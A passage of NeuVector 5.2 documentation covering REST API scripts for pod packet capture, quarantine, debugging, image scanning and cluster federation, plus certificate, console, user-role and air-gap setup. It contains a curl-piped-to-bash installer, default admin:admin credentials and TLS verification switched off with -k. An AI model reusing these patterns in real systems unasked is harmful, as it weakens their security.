curl 2&gt;/dev/null || { echo &gt;&amp;2 &quot;Required curl but it's not installed. Aborting.&quot;; exit 1; } hash jq 2&gt;/dev/null || { echo &gt;&amp;2 &quot;Required jq but it's not installed. Aborting.&quot;; exit 1;} script=&quot;$0&quot; usage() { echo &quot;Usage: $script -n [namespace] -d [pcap duration (seconds)] -l [https://nvserver:10443]&quot; 1&gt;&amp;2; exit 1; } while getopts &quot;:n:d:l:h&quot; opt; do case $opt in n) NAMESPACE=$OPTARG ;; d) DURATION=$OPTARG ;; l) URL=&quot;$OPTARG/v1&quot; ;; h) usage ;; \\?) echo &quot;Invalid option, $OPTARG. Try -h for help.&quot; 1&gt;&amp;2 ;; :) echo &quot;Invalid option: $OPTARG requires an argument&quot; 1&gt;&amp;2 esac done if [ ! &quot;$NAMESPACE&quot; ] || [ ! &quot;$DURATION&quot; ] || [ ! &quot;$URL&quot; ] then usage exit 1 fi count=0 for i in `kubectl -n $NAMESPACE get pods -o wide 2&gt; /dev/null | tail -n +2 | awk '{print $1}' | sed 's|\\(.*\\)-.*|\\1|' | uniq`; do CHOICE1[count]=$i count=$count+1 done if [ -z ${CHOICE1[0]} ]; then echo &quot;No pods found in $NAMESPACE.&quot; exit 1 else for i in &quot;${!CHOICE1[@]}&quot; do echo &quot;$i : ${CHOICE1[$i]}&quot; done read -p &quot;Packet capture on which pod group? &quot; -r if [ -n $REPLY ]; then POD_STRING=${CHOICE1[$REPLY]} echo $POD_STRING &quot; selected.&quot; else exit 1 fi fi sniffer_start() { URI=&quot;/sniffer?f_workload=$1&quot; sniff_id=$(curl -ks --location --request POST ${URL}${URI} &quot;${curlHeaders[@]}&quot; --data-raw '{ &quot;sniffer&quot;: { &quot;file_number&quot;: 1, &quot;filter&quot;: &quot;&quot; }}' | jq .result.id) echo $sniff_id } sniffer_stop() { URI=&quot;/sniffer/stop/${1}&quot; status_code=`curl -ks -w &quot;%{http_code}&quot; --location --request PATCH ${URL}${URI} &quot;${curlHeaders[@]}&quot;` echo $status_code } sniffer_pcap_get() { URI=&quot;/sniffer/${1}/pcap&quot; status_code=`curl -ks -w &quot;%{http_code}&quot; --location --request GET ${URL}${URI} &quot;${curlHeaders[@]}&quot; -o $1.pcap` echo $status_code } sniffer_pcap_delete() { URI=&quot;/sniffer/${1}&quot; status_code=`curl -ks -w &quot;%{http_code}&quot; --location --request DELETE ${URL}${URI} &quot;${curlHeaders[@]}&quot;` echo $status_code } show_menu() { count=0 for i in &quot;Exit script&quot; &quot;Start packet capture for $DURATION seconds&quot; &quot;Download packet capture from pods&quot; &quot;Delete packet capture from pods&quot;; do CHOICE2[count]=$i count=$count+1 done echo echo &quot;Selections:&quot; for i in &quot;${!CHOICE2[@]}&quot; do echo &quot;$i : ${CHOICE2[$i]}&quot; done } get_token() { read -p &quot;Enter NeuVector Username: &quot; USER if [ -z $USER ]; then echo &quot;Blank username, exiting...&quot; exit 1 fi read -s -p &quot;Enter password: &quot; PASS if [ -z $PASS ]; then echo echo &quot;Blank password, exiting...&quot; exit 1 fi TOKEN=`curl -ks --location --request POST ${URL}/auth \\ --header &quot;accept: application/json&quot; \\ --header &quot;Content-Type: application/json&quot; \\ --data-raw '{&quot;password&quot;: {&quot;username&quot;: &quot;'$USER'&quot;, &quot;password&quot;: &quot;'$PASS'&quot;}}'|jq .token.token` echo $TOKEN } TOKEN=$(get_token) while [ &quot;$TOKEN&quot; = &quot;null&quot; ]; do echo echo &quot;Authenticating failed, retry.&quot; TOKEN=$(get_token) done TOKEN=${TOKEN:1:${#TOKEN}-2} echo declare -a curlHeaders=('-H' &quot;Content-Type: application/json&quot; '-H' &quot;X-Auth-Token: $TOKEN&quot;) echo &quot;Pulling worklods from $URL&quot; declare -a workloads=&quot;($( curl -ks --location --request GET ${URL}/workload &quot;${curlHeaders[@]}&quot; \\ | jq '.workloads[] | select(.display_name | startswith(&quot;'${POD_STRING}'&quot;))| select(.domain==&quot;'$NAMESPACE'&quot; and .cap_sniff==true) | .display_name + &quot;::&quot; +.id' -r ))&quot; if [ ${#workloads[@]} -eq 0 ]; then echo echo &quot;No pods is capable of packet capture. Only ethernet IP part of Kubernetes CIDR can packet capture.&quot; exit 1 else echo echo &quot;List of Pods to perform capture on.&quot; echo &quot;Pod Name : ID&quot; for pods in &quot;${workloads[@]}&quot; ; do POD_NAME=&quot;${pods%%::*}&quot; POD_ID=&quot;${pods##*::}&quot; echo &quot;$POD_NAME : $POD_ID&quot; done fi while :; do show_menu read -p &quot;Choice? &quot; -r if [ -n $REPLY ]; then case &quot;$REPLY&quot; in 0) exit 0; ;; 1) counter=0 declare -a sniffs; for pods in &quot;${workloads[@]}&quot;; do POD_ID=&quot;${pods##*::}&quot; sniff_id=&quot;$(sniffer_start $POD_ID)&quot;; sniffs[$counter]=$sniff_id counter=$((counter+1)) done echo &quot;Running pcap for ~$DURATION seconds.&quot;; sleep $DURATION; for sniff_id in &quot;${sniffs[@]}&quot;; do sniff_id=${sniff_id:1:${#sniff_id}-2} status=&quot;$(sniffer_stop $sniff_id)&quot;; done ;; 2) for sniff_id in &quot;${sniffs[@]}&quot;; do sniff_id=${sniff_id:1:${#sniff_id}-2} status=&quot;$(sniffer_pcap_get $sniff_id)&quot;; done ;; 3) for sniff_id in &quot;${sniffs[@]}&quot;; do sniff_id=${sniff_id:1:${#sniff_id}-2} status=&quot;$(sniffer_pcap_delete $sniff_id)&quot;; done ;; esac else exit 1 fi done   Enable Disable Container Quarantine​  The API call to quarantine is via PATCH to /v1/workload/:id with the following body. The workload id is the container/pod id.  --data-raw '{ &quot;config&quot;: { &quot;quarantine&quot;: true, &quot;wire&quot;: &quot;default&quot;, &quot;quarantine_reason&quot;: &quot;violation&quot; } }'   Enable Debugging Mode for NeuVector Support​  Set access token with your IP, user, password:  _controllerIP_=&quot;&lt;your_controller_ip&gt;&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot;   Get the authentication token  curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, &quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'`   Enable Debug Mode  curl -X PATCH -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;controller_debug&quot;: [&quot;cpath&quot;, &quot;conn&quot;]}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; set_debug.json #debug options - cpath, conn, mutex, scan, cluster , all   Disable Debug on all controllers in a cluster  curl -X PATCH -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;controller_debug&quot;: []}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; set_debug.json   Check the controller debug status in a cluster  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; system_setting.json cat system_setting.json | jq .config.controller_debug   Logout  echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1   Report if a vulnerability is in the base image layers​  To identify CVE's in the base image when using REST API to scan images, the base image must be identified in the API call, as in the example below.  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;https://registry.hub.docker.com/&quot;, &quot;repository&quot;: &quot;garricktam/debian&quot;, &quot;tag&quot;: &quot;latest&quot;, &quot;scan_layers&quot;: false, &quot;base_image&quot;: &quot;2244...../nodejs:3.2......&quot;}}' &quot;https://$RESTURL/v1/scan/repository&quot; {noformat}   Limitations: If the image to be scanned is a remote image, with &quot;registry&quot; specified, the base image must also be a remote image, and the name must start with http or https. If the image to be scanned is a local image, then the base image must also be a local image as well.  For example,  {&quot;request&quot;: {&quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.2&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;alpine:3.12.0&quot;}} {&quot;request&quot;: {&quot;registry&quot;: &quot;https://10.1.127.12:5000/&quot;, &quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.0&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;https://registry.hub.docker.com/alpine:3.12.0&quot;}} {&quot;request&quot;: {&quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.2&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;10.1.127.12:5000/neuvector/manager:4.0.2”}}   Get the CVE Database Version and Date​  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://127.0.0.1:10443/v1/scan/scanner&quot;   Output:  { &quot;scanners&quot;: [ { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;0f043705948557828ac1831ee596588a0d050950113117ddd19ecd604982f4d9&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;127.0.0.1&quot; }, { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;9fa02c644d603f59331c95735158d137002d32a75ed1014326f5039f38d4d717&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;192.168.9.95&quot; } ] }   Manage Federation for Master and Remote (Worker) Clusters​  Generally, listing Federation members can use a GET to the following endpoint (see samples for specific syntax):https://neuvector-svc-controller.neuvector:10443/v1/fed/member  Selected Federation Management API's:  _masterClusterIP_=$1 _workerClusterIP_=$2 # this is used if one of clusters is going to be kicked by master cluster _CLUSTER_name_=$3 echo `date +%Y%m%d_%H%M%S` [$_curCase_] login as default admin user curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://$_masterClusterIP_:10443/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./$_LOGFOLDER_/token.json _TOKEN_M_=`cat ./$_LOGFOLDER_/token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` [$_curCase_] promote to master cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_M_&quot; -d '{&quot;master_rest_info&quot;: {&quot;port&quot;: 11443, &quot;server&quot;: &quot;'$_masterClusterIP_'&quot;}, &quot;name&quot;: &quot;master&quot;}' &quot;https://$_masterClusterIP_:10443/v1/fed/promote&quot; &gt; /dev/null 2&gt;&amp;1 echo `date +%Y%m%d_%H%M%S` [$_curCase_] idle 6 seconds for logon session timeout sleep 6 echo `date +%Y%m%d_%H%M%S` [$_curCase_] login as default admin user on master cluster curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://$_masterClusterIP_:10443/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./token.json _TOKEN_M_=`cat ./token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` [$_curCase_] checking fed join_token on master cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_M_&quot; &quot;https://$_masterClusterIP_:10443/v1/fed/join_token&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./join_token.json cat ./join_token.json | jq -c . _JOIN_TOKEN_=`cat ./join_token.json | jq -r '.join_token'` echo `date +%Y%m%d_%H%M%S` [$_curCase_] login as default admin user on worker cluster curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://$_workerClusterIP_:10443/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./token.json _TOKEN_W_=`cat ./token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` [$_curCase_] joining the cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_W_&quot; -d '{&quot;join_token&quot;: &quot;'$_JOIN_TOKEN_'&quot;, &quot;name&quot;: &quot;worker&quot;, &quot;joint_rest_info&quot;: {&quot;port&quot;: 10443, &quot;server&quot;: &quot;'$_workerClusterIP_'&quot;}}' &quot;https://$_workerClusterIP_:10443/v1/fed/join&quot; &gt; /dev/null 2&gt;&amp;1 echo `date +%Y%m%d_%H%M%S` [$_curCase_] idle 9 seconds for events sleep 9 ########## whenever there is a change on cluster such as a cluster is kicked/left/joined, run this to check the status ############ echo `date +%Y%m%d_%H%M%S` [$_curCase_] checking fed member on master cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_M_&quot; &quot;https://$_masterClusterIP_:10443/v1/fed/member&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./fedMember.json cat ./fedMember.json | jq -c . echo `date +%Y%m%d_%H%M%S` [$_curCase_] checking fed member on worker cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_W_&quot; &quot;https://$_workerClusterIP_:10443/v1/fed/member&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./fedMember.json cat ./fedMember.json | jq -c . _CLUSTER_id_=`cat ./fedMember.json | jq -r --arg _CLUSTER_name_ &quot;$_CLUSTER_name_&quot; '.joint_clusters[] | select(.name == $_CLUSTER_name_).id'` ################################################################################################################################### ########## for ur information to leave or kick the cluster ############ echo `date +%Y%m%d_%H%M%S` [$_curCase_] requesting to leave on worker cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_W_&quot; -d '{&quot;force&quot;: false}' &quot;https://$_workerClusterIP_:10443/v1/fed/leave&quot; &gt; /dev/null 2&gt;&amp;1 echo `date +%Y%m%d_%H%M%S` [$_curCase_] idle 9 seconds for events sleep 9 echo `date +%Y%m%d_%H%M%S` [$_curCase_] requesting to kick on master cluster, $_CLUSTER_id_ curl -k -X &quot;DELETE&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_M_&quot; &quot;https://$_masterClusterIP_:10443/v1/fed/cluster/$_CLUSTER_id_&quot; &gt; /dev/null 2&gt;&amp;1 echo `date +%Y%m%d_%H%M%S` [$_curCase_] idle 9 seconds for events sleep 9 #######################################################################  ","version":"5.2","tagName":"h3"},{"title":"Configuring NeuVector and Accessing the Console","type":0,"sectionRef":"#","url":"/5.2/configuration","content":"Configuring NeuVector and Accessing the Console How to perform initial configurations and access the console.","keywords":"","version":"5.2"},{"title":"Chrome Certificate Upload - MacOS","type":0,"sectionRef":"#","url":"/5.2/configuration/console/chrome","content":"","keywords":"","version":"5.2"},{"title":"Enabling Chrome Browsers to Accept the NeuVector Self-Signed Certificate on MacOS​","type":1,"pageTitle":"Chrome Certificate Upload - MacOS","url":"/5.2/configuration/console/chrome#enabling-chrome-browsers-to-accept-the-neuvector-self-signed-certificate-on-macos","content":" Under certain circumstances the Chrome browser will flat out refuse to accept a NeuVector self-signed certificate. A possible reason could be that the certificate has not yet been imported into macOS login certificates store. Another possibility is that an existing certificate has not yet been configured to be trusted. This will disallow the user from accepting it and proceeding to the NeuVector login page with the use of Chrome as illustrated with the example shown below:    Corrective steps can be taken to enable Chrome on accepting the self-signed certificate placed on macOS Keychain store. This can be done by configuring the NeuVector’s certificate to be trusted using the Mac’s Keychain Access application. This is with the assumption that the certificate does indeed exists in the macOS Keychain Access store. We will first look at how to export a certificate from an existing NeuVector node from one system, and later can be imported into another system. There are 2 ways to go about exporting the certificate which we will go over below. They are, using the Chrome browser, and using the macOS Keychain Access application.  Certificate export using Chrome​  The screen capture below illustrates how to access the NeuVector certificate using Chrome.    To export the certificate, drag and drop the certificate to a location of choice.    Certificate export using macOS Keychain-Access​  Launch the macOS Keychain Access application by simultaneously entering the keys ⌘ + F using a Mac keyboard, search for Keychain Access, and double click on the application. This launches the Keychain Access application. Select the NeuVector certificate and choose Export “NeuVector” from the dropdown menu. This will allow the export of the certificate to a location of choice.    Launching the macOS Keychain-Access Application​  There are two ways to launch the macOS Keychain Access Application. This can be done by searching from the macOS, which has been described from the steps immediately above, or using the Chrome browser.  Launching Keychain-Access from the Chrome Browser​  Settings &gt; Advanced &gt; Manage certificates    Clicking on the Manage certificates as shown from above launches the Mac’s Keychain Access application as shown below.    Certificate import into the macOS Keychain-Access Store​  Launch the macOS Keychain Access application by simultaneously entering the keys ⌘ + F using a Mac keyboard, search for Keychain Access, and click on the application. Then import the certificate by drag and dropping a NeuVector certificate (example: nvcertificate.cer) into the Certificate right pane of the Keychain Access application. Now that the certificate has been imported, it is not yet trusted. The following is an example showing the default trust settings after a NeuVector’s certificate has been imported into the Keychain Access application.    Notice that none of the parameters have been configured, and it is not trusted by default. It needs to be configured to be trusted to allow the user to access the login page using the Chrome browser.  Enabling trust for the NeuVector Certificate​  The following steps details on how to enable trust for the NeuVector certificate in the Keychain Access store.    Double clicking on the NeuVector certificate from the screen capture above will bring up another popup dialog box that allows the trust permissions to be configured for different parameters. Configure Secure Sockets Layer (SSL) to “Always Trust”.    Close the dialog box and click on ‘Update Settings” after entering the Mac logon user’s password from the following popup dialog box.    This finalizes the trust configurations. Next, clear all Chrome browser’s cache, close all Chrome browsers, and relaunch the Chrome browser. Next visit the NeuVector login page, and upon clicking on the “Advanced” link, the Proceed to … (unsafe) link will be shown. Clicking on the Proceed to … (unsafe) will allow the user to proceed to the username and password login page.    Below shows a screen capture that allows the user to proceed to the NeuVector login page after Proceed to … (Unsafe) link is clicked.   ","version":"5.2","tagName":"h3"},{"title":"Connect to Manager, REST API server","type":0,"sectionRef":"#","url":"/5.2/configuration/console","content":"","keywords":"","version":"5.2"},{"title":"Connect to UI​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/5.2/configuration/console#connect-to-ui","content":" Open a browser window, connect to the manager or all-in-one container's host IP on default port 8443 using HTTPS. After accepting the EULA, the user is able to access the UI.  https://&lt;manager_host_ip&gt;:8443     You can manage NeuVector from the Console or by using the REST API.  note See below for cases where your corporate firewall blocks 8443.  note If your Chrome browser blocks the NeuVector self-signed certificate, see the next section on Chrome Certificate Upload.  ","version":"5.2","tagName":"h3"},{"title":"Connect to REST API Server​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/5.2/configuration/console#connect-to-rest-api-server","content":" All operations in NeuVector can be invoked through the REST API instead of the console. The REST API server is part of the Controller/Allinone container. For details on the REST API, please see the section on Workflow and Automation.  ","version":"5.2","tagName":"h3"},{"title":"Default username and password​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/5.2/configuration/console#default-username-and-password","content":" admin:admin  After successful login, the admin user should update the account with a more secure password.  ","version":"5.2","tagName":"h3"},{"title":"Creating Additional Users​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/5.2/configuration/console#creating-additional-users","content":" New users can be added from the Settings -&gt; Users &amp; Roles menu. There are predefined global roles in NeuVector:  Admin. Able to perform all actions except Federated policies.Federated Admin. Able to perform all actions, including setting up Master/Remote clusters and Federated policies (rules). Only visible if Multi-cluster is enabled.View Only (reader). No actions allowed, just viewing.CI Integration (ciops). Able to perform CI/CD scanning integration tasks such as image scanning. This user role is recommended for use in build-phase scanning plug-ins such as Jenkins, Bamboo etc and for use in the REST API calls. It is limited to scanning functions and will not be able to do any actions in the console.  Users can be restricted to one or more namespaces using the Advanced Settings.  See the section Users &amp; Roles for advanced user management and creation of custom roles.  ","version":"5.2","tagName":"h3"},{"title":"Connection Timeout Setting​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/5.2/configuration/console#connection-timeout-setting","content":" You can set the number of seconds which the console will timeout in the upper right of the console in My Profile -&gt; Session timeout. The default is 5 minutes and the maximum is 3600 seconds (1 hour).  ","version":"5.2","tagName":"h3"},{"title":"Enabling HTTP for Manager​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/5.2/configuration/console#enabling-http-for-manager","content":" To disable HTTPS and enable HTTP access, add this to the Manager or Allinone yaml section in the environment variables section. For example, in Kubernetes:  - name: MANAGER_SSL value: “off”   For OpenShift, also remove this setting from the Route section of the yaml:  tls: termination: passthrough   This is useful if putting the manager behind a load balancer.  ","version":"5.2","tagName":"h3"},{"title":"Enabling Access from Corporate Network Which Blocks 8443​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/5.2/configuration/console#enabling-access-from-corporate-network-which-blocks-8443","content":" If your corporate network does not allow access on port 8443 to the Manager console, you can create an ingress service to map it and allow access.  note The NeuVector UI console is running as non-root user in the container, so it cannot listen on a port less than 1024. This is why it can't be changed to 443.  If you are trying to access the console from your corporate network. Here is the way to use the ClusterIP service and ingress HTTPS redirect to achieve that.  First, create a certificate for HTTPS termination. Here is an example,  openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj &quot;/CN=mycloud.domain.com&quot; kubectl create secret tls neuvector-ingress-tls -n neuvector --key=&quot;tls.key&quot; --cert=&quot;tls.crt&quot;   Then, use the following yaml file to expose the 443 port that redirects the HTTPS connection to the manager.  apiVersion: v1 kind: Service metadata: name: neuvector-cluster-webui namespace: neuvector spec: ports: - port: 443 targetPort: 8443 protocol: TCP type: ClusterIP selector: app: neuvector-manager-pod --- apiVersion: extensions/v1beta1 kind: Ingress metadata: name: neuvector-ingress-webui namespace: neuvector annotations: ingress.mycloud.net/ssl-services: ssl-service=neuvector-cluster-webui spec: tls: - hosts: - cloud.neuvector.com secretName: neuvector-ingress-tls rules: - host: cloud.neuvector.com http: paths: - path: backend: serviceName: neuvector-cluster-webui servicePort: 443   You will need to change the annotation for the ingress address from ingress.mycloud.net to your appropriate address.  This example uses the URL cloud.neuvector.com. After the ingress service is created, you can find it's external IP. You then can configure the hosts file to point cloud.neuvector.com to that IP. After that, you should be able to browse to https://cloud.neuvector.com (the url you choose to use).  Using SSL Passthrough Instead of Redirect​  To use TLS/SSL passthrough instead of the redirect example above (supported on some ingress controllers such as nginx), make sure the ingress controller is configured appropriated for passthrough, and the appropriate annotation is added to the ingress. For example,   annotations: ingress.kubernetes.io/ssl-passthrough: &quot;true&quot;   ","version":"5.2","tagName":"h3"},{"title":"Replacing the NeuVector Self-signed Certificates​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/5.2/configuration/console#replacing-the-neuvector-self-signed-certificates","content":" Please see the next section Replacing the Self-Signed Certificates for details. The certificate must be replaced in both the Manager and Controller/Allinone yamls.  ","version":"5.2","tagName":"h3"},{"title":"Configuring AWS ALB with Certificate ARN​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/5.2/configuration/console#configuring-aws-alb-with-certificate-arn","content":" Here is a sample ingress configuration using the AWS load balancer with the certificate ARN (actual ARN obfuscated).  apiVersion: extensions/v1beta1 kind: Ingress metadata: annotations: # https://kubernetes-sigs.github.io/aws-alb-ingress-controller/guide/ingress/annotation/#healthcheck-path alb.ingress.kubernetes.io/backend-protocol: HTTPS alb.ingress.kubernetes.io/certificate-arn: arn:aws:acm:us-west-2:596810101010:certificate/380b6abc-1234-408d-axyz-651710101010 alb.ingress.kubernetes.io/healthcheck-path: / alb.ingress.kubernetes.io/healthcheck-protocol: HTTPS alb.ingress.kubernetes.io/listen-ports: '[{&quot;HTTPS&quot;:443}]' alb.ingress.kubernetes.io/scheme: internet-facing alb.ingress.kubernetes.io/success-codes: &quot;301&quot; alb.ingress.kubernetes.io/target-type: instance external-dns.alpha.kubernetes.io/hostname: eks.neuvector.com kubernetes.io/ingress.class: alb labels: app: neuvector-webui-ingress name: neuvector-webui-ingress namespace: neuvector spec: tls: - hosts: - eks.neuvector.com rules: - http: paths: - backend: serviceName: neuvector-service-webui servicePort: 8443 path: /*  ","version":"5.2","tagName":"h3"},{"title":"Users and Roles","type":0,"sectionRef":"#","url":"/5.2/configuration/users","content":"","keywords":"","version":"5.2"},{"title":"Configuring Users and Custom Roles​","type":1,"pageTitle":"Users and Roles","url":"/5.2/configuration/users#configuring-users-and-custom-roles","content":" The Settings -&gt; Users and Roles menu enables management of users as well as roles. Each user is assigned to a predefined or custom role. Users can be mapped to roles through group integration with LDAP/AD or other SSO system integrations. See the Enterprise Integration section for detailed instructions for each type or directory or SSO integration.  Users​  Users can be configured directly in NeuVector or integrated through directories/SSO. To create a new user in NeuVector go to Settings -&gt; Users &amp; Roles and add the user. Select the role of the user from the predefined roles, or see below to create a custom role.  The default password requirement is minimum 8 characters length, 1 uppercase letter, 1 lowercase letter, 1 numeric character. These and other requirements can be changed by an admin in Settings -&gt; Users under Authentication and Security Policies.  Namespace Restricted Users​  Users can be restricted to certain namespaces. First select the global role (use 'none' if no global role is desired), then click on the Advanced Settings.  Select a role name from the list of roles, then enter the namespace(s) which the user allowed. For example, below is a global reader (view only) role, but for namespace 'demo' the user has admin permissions and for the namespace 'staging' the user has CI/Ops permissions. If a custom role was previously configured that can also be selected.    note If a user has previously logged in through an enterprise integration, their Identify Provider (e.g. OpenID Connect) will be listed. A user can be promoted to a Federated admin if multi-cluster management is in use by selecting the user and editing.  note When a namespace restricted user configures a registry in Assets in NeuVector, only users with access to that namespace can see/scan that registry. Global users will be able to see/manage that registry, but not any users with restricted namespaces / role.  Roles​  Preconfigured roles include Admin, Reader, and CI/Ops. To create a new custom role, select the Roles tab in Settings -&gt; Users &amp; Roles. Name the role and add the appropriate read or write permission to it.    RBAC Permissions​  Admission Control. Manage admission control rules.Audit Events. View Notification -&gt; Risk reports logs.Authentication. Enable directory and SSO (oidc/saml/ldap) configuration.Authorization. Create new users and custom roles.CI Scan. Allows scanning on images through REST API. Useful for configuring a build-phase plug-in scanner user.Compliance. Create custom compliance scripts and review Compliance check results.Event. Access Notifications -&gt; Events logs.Registry Scan. Configure registry scanning and view results.Runtime Policy. Manage Policy menus for Policy Mode (Discover, Monitor, Protect), Network Rules, Process Rules, File Access Rules, DLP, Packet capture, Response Rules.Runtime Scan. Trigger and view run-time vulnerability scanning of containers/nodes/platform.Security Event. Access Notifications -&gt; Security Events logs.System Config. Allow configuration of Settings -&gt; Configuration.  Mapping Groups to Roles and Namespaces​  Groups can be mapped to preset or custom roles in NeuVector. In addition, a role can be restricted to one or more namespaces.  In the LDAP/AD, SAML, or OIDC configuration in Settings, the last section of the configuration screen maps Groups to Roles and Namespaces. First select a default role, if any, for mapping.    To map a group to a role and namespace, click Add to create a new mapping. Select a global role or none. If admin or FedAdmin is selected, this gives write access to all namespaces. If a different role is selected, it can be further restricted by selecting the desired namespace(s).    The following example provides some possible mappings. Demo_admin can read/view all namespaces but has admin rights to the demo and demo2 namespaces. System_admin only has admin rights to the kube-system namespace. And fed_admins has the preset fedAdmin role which gives write access to all resources across multiple clusters.    important If the user is in multiple groups, the role will be 'first matched' in the order listed and group's role assigned. Please adjust the order of configuration for proper behavior by dragging and dropping the mappings to the appropriate order in the list.  Multi-Cluster FedAdmin and Admin Roles for Primary and Remote Management​  When a cluster is promoted to be a Primary cluster, the admin becomes a FedAdmin automatically. The FedAdmin can perform operations on the primary such as generate a federation token for connecting a remote cluster as well as creating federated security rules such as network, process, file, and admission control rules.  Multi-cluster management roles are as follows:  On any cluster, a local admin or a Rancher SSO admin can promote the cluster to become a primary.Ldap/SSO/SAML/OIDC users with admin roles are not able to promote a cluster to primary.Only the FedAdmin can generate the token required to join a remote cluster to the primary.Any admin, including ldap/sso/saml/oidc users can join a remote cluster to the primary if they have the token.Only the FedAdmin can create a new user as a FedAdmin (or FedReader) or assign the FedAdmin (or FedReader) role to an existing user (including ldap/sso/saml/oidc users). ","version":"5.2","tagName":"h3"},{"title":"Deployments of the NeuVector Containers, Services, and Required Configurations","type":0,"sectionRef":"#","url":"/5.2/deploying","content":"Deployments of the NeuVector Containers, Services, and Required Configurations Topics for planning and deploying for testing and to production on various platforms using Kubernetes, Rancher, OpenShift, &amp; Docker compose.","keywords":"","version":"5.2"},{"title":"Air Gapping NeuVector","type":0,"sectionRef":"#","url":"/5.2/deploying/airgap","content":"","keywords":"","version":"5.2"},{"title":"Tools Needed​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/5.2/deploying/airgap#tools-needed","content":" We need to install three tools for downloading all the bits for Neuvector.  Helm - Application Lifecycle ManagerSkopeo - Image/Registry ToolZStandard - Compresstion Algorithm  # install helm curl -fsSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash # install skopeo - rocky linux based yum install zstd skopeo -y   ","version":"5.2","tagName":"h3"},{"title":"Get Images and Chart​","type":1,"pageTitle":"Air Gapping NeuVector","url":"/5.2/deploying/airgap#get-images-and-chart","content":" In order to get all the images we are going to use the chart itself. Using Helm let's add the repo and download the chart. We will also use skopeo for downloading and uploading.  # make a directory mkdir -p neuvector/images # add repo helm repo add neuvector https://neuvector.github.io/neuvector-helm/ # update local chart helm repo update # pull helm pull neuvector/core -d neuvector   You should now see a file like 